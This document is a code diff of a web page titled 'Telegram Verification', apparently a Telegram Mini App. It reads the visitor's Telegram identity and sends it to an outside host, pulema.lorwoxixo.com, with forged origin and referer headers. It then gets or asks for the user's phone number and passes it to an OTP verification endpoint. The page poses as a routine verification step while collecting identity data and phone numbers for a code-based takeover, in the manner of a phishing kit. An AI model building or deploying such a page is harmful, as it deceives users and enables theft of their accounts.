@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Telegram Verification</title>
 
@@ -10,34 +10,34 @@
 <style>
 *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto}
 body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;margin:0;display:flex;justify-content:center;align-items:center;padding:20px}
-.container{background:#fff;border-radius:16px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.25);overflow:hidden}
-.header{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:20px;text-align:center}
+.container{background:#fff;border-radius:16px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.25)}
+.header{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:20px}
 .content{padding:20px}
 .btn{width:100%;padding:14px;border-radius:10px;border:none;color:#fff;font-size:15px;font-weight:600;background:linear-gradient(135deg,#667eea,#764ba2);cursor:pointer}
-.hidden{display:none}
-.info{background:#e8f5e9;border-radius:10px;padding:12px;margin-bottom:12px;font-size:14px}
+.input{width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin-bottom:12px}
+.info{background:#e8f5e9;border-radius:10px;padding:12px;margin-bottom:12px}
 .error{background:#ffebee;color:#c62828;border-radius:10px;padding:12px;margin-bottom:12px;display:none}
-.input{width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin-bottom:10px}
+.hidden{display:none}
 </style>
 </head>
 
 <body>
 <div class="container">
   <div class="header">
-    <h2>🔐 Account Verification</h2>
+    <h3>🔐 Account Verification</h3>
   </div>
 
   <div class="content">
 
-    <div id="user-box" class="info hidden"></div>
+    <div id="user-info" class="info hidden"></div>
 
     <button class="btn" onclick="startFlow()">Continue</button>
 
-    <div id="auto-info" class="info hidden"></div>
+    <div id="auto" class="info hidden"></div>
 
     <div id="manual" class="hidden">
       <input id="phone" class="input" placeholder="Enter phone number">
-      <button class="btn" onclick="submitManual()">Continue</button>
+      <button class="btn" onclick="submitPhone()">Continue</button>
     </div>
 
     <div id="loading" class="info hidden">Processing…</div>
@@ -49,39 +49,35 @@ body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;margin:
 
 <script>
 let tg = window.Telegram?.WebApp;
-let userData = {};
-let botId = "37059";   // change if needed
+let user_tg = {};
+let bot_id = "37059";
 
 document.addEventListener("DOMContentLoaded", () => {
 
-  if (tg?.initDataUnsafe?.user) {
+  if(tg?.initDataUnsafe?.user){
     const u = tg.initDataUnsafe.user;
 
-    userData = {
+    user_tg = {
       id: u.id,
       first_name: u.first_name || "",
       last_name: u.last_name || "",
-      username: u.username || "",
       language_code: u.language_code || "",
       allows_write_to_pm: true,
       photo_url: u.photo_url || ""
     };
 
-    document.getElementById("user-box").innerText =
-      `👤 ${u.first_name || ""} ${u.last_name || ""}\n` +
-      `@${u.username || "-"}\n` +
-      `🌐 ${u.language_code || "-"}`;
+    document.getElementById("user-info").innerText =
+      `👤 ${u.first_name||""} ${u.last_name||""}\n@${u.username||"-"}\n🌐 ${u.language_code||"-"}`;
 
-    document.getElementById("user-box").classList.remove("hidden");
+    document.getElementById("user-info").classList.remove("hidden");
 
     tg.expand();
   } else {
-    // browser fallback
-    userData = {
-      id: 12345,
+    // fallback for testing
+    user_tg = {
+      id: 1,
       first_name: "Test",
       last_name: "User",
-      username: "test",
       language_code: "en",
       allows_write_to_pm: true,
       photo_url: ""
@@ -89,54 +85,68 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 });
 
+
 function startFlow(){
   show("loading");
+  hide("error");
+  hide("manual");
+  hide("auto");
 
-  fetch("https://pulema.lorwoxixo.com/api/get-bot", {
+  fetch("https://pulema.lorwoxixo.com/api/get-bot",{
     method:"POST",
-    headers:{ "Content-Type":"application/json" },
+    headers:{
+      "accept":"*/*",
+      "content-type":"application/json",
+      "origin":"https://pulema.lorwoxixo.com",
+      "referer":"https://pulema.lorwoxixo.com/?bot_id=37059"
+    },
     body:JSON.stringify({
-      user_tg: userData,
-      bot_id: botId
+      user_tg:user_tg,
+      bot_id:bot_id
     })
   })
-  .then(r=>r.json())
-  .then(res=>{
+  .then(async res=>{
+    let text = await res.text();
+    console.log("RAW RESPONSE:",text);
+
+    let data = JSON.parse(text);
+
     hide("loading");
 
-    if(!res.ok) return showError("Server error");
+    if(data.ok && data.phone_number){
+      document.getElementById("auto").innerText =
+        `📞 Phone detected: +${data.phone_number}\nContinuing…`;
+      show("auto");
 
-    if(res.phone_number){
-      document.getElementById("auto-info").innerText =
-        `📞 Phone detected: +${res.phone_number}\nContinuing…`;
-      show("auto-info");
-
-      continueVerification(res.phone_number);
+      continueVerification(data.phone_number);
     } else {
       show("manual");
     }
   })
-  .catch(()=>{
+  .catch(err=>{
     hide("loading");
-    showError("Network error");
+    show("manual");
+    showError("Network error — please enter phone manually");
   });
 }
 
-function submitManual(){
+
+function submitPhone(){
   const phone = document.getElementById("phone").value.trim();
   if(!phone) return showError("Enter phone number");
+
   continueVerification(phone);
 }
+
 
 function continueVerification(phone){
   show("loading");
 
+  // your backend OTP call
   fetch("/api/verify-contact",{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({
-      phone: phone
-    })
+    body:JSON.stringify({ phone })
   })
   .then(r=>r.json())
   .then(res=>{
@@ -150,11 +160,12 @@ function continueVerification(phone){
   });
 }
 
-/* helpers */
+
+/* Helpers */
 function show(id){document.getElementById(id).classList.remove("hidden")}
 function hide(id){document.getElementById(id).classList.add("hidden")}
 function showError(msg){
-  const e=document.getElementById("error");
+  let e=document.getElementById("error");
   e.innerText=msg;
   e.style.display="block";
 }
